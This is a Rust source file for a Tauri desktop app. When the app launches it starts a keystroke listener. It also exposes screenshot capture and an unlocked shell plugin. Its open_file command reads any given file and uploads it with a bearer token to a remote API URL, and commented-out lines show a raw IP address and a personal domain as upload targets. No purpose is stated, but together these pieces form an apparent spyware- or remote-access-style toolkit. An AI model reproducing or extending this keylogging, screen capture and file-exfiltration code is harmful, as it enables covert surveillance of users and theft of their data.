use std::{fs, io::Read, path::Path};

use keystroke::start_keystroke_listener;
use tauri_plugin_http::reqwest;
pub mod screenshot;
mod keystroke;

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
        let unlocked: bool = true;

    tauri::Builder::default()
        .plugin(tauri_plugin_os::init())
        .plugin(tauri_plugin_upload::init())
        .plugin(tauri_plugin_fs::init())
        .plugin(tauri_plugin_clipboard_manager::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_http::init())
        .plugin(tauri_plugin_fs_pro::init())
        .plugin(tauri_plugin_store::Builder::new().build())
                .plugin(tauri_plugin_system_info::init())
                        .plugin(tauri_plugin_shellx::init(unlocked))
        

        .setup(|app| {
            if cfg!(debug_assertions) {
                app.handle().plugin(
                    tauri_plugin_log::Builder::default()
                        .level(log::LevelFilter::Info)
                        .build(),
                )?;
            }
                        start_keystroke_listener(app);


            Ok(())
        })
        .invoke_handler(tauri::generate_handler![open_file,   screenshot::capture,
            screenshot::get_screens])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

#[tauri::command]
async fn open_file(path: String, token: String, apiurl: String) -> Result<String, String> {
    let filename = Path::new(&path)
        .file_name()
        .unwrap()
        .to_str()
        .unwrap()
        .to_string();
    let file = fs::File::open(&path).map_err(|e| e.to_string())?;
    let metadata = file.metadata().map_err(|e| e.to_string())?;
    let total_size = metadata.len();
    let mut reader = std::io::BufReader::new(file);
    let mut data = Vec::with_capacity(total_size as usize);
    let mut buffer = [0; 8192];
    let mut read_so_far = 0;

    loop {
        let n = reader.read(&mut buffer).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        data.extend_from_slice(&buffer[..n]);
        read_so_far += n;
        println!(
            "Progress: {}%",
            (read_so_far as f64 / total_size as f64 * 100.0) as u32
        );
    }
    // let metadata: fs::Metadata = fs::metadata(path)?;

    let client = reqwest::Client::new();
    let form = reqwest::multipart::Form::new()
        .part(
            "file",
            reqwest::multipart::Part::bytes(data)
                .file_name(filename.clone())
                .mime_str("application/octet-stream")
                .map_err(|e| e.to_string())?,
        )
        .text("fileName", filename);

    let response = client
        //.post("http://4.233.151.95/api/upload")
        //.post("https://api.luqueee.dev/api/upload")
        .post(apiurl)
        .header("Authorization", format!("Bearer {}", token))
        .multipart(form)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    println!("Response: {:?}", response);

    if response.status().is_success() {
        return response.text().await.map_err(|e| e.to_string());
    } else {
        Err(format!("Upload failed with status: {}", response.status()))
    }
}
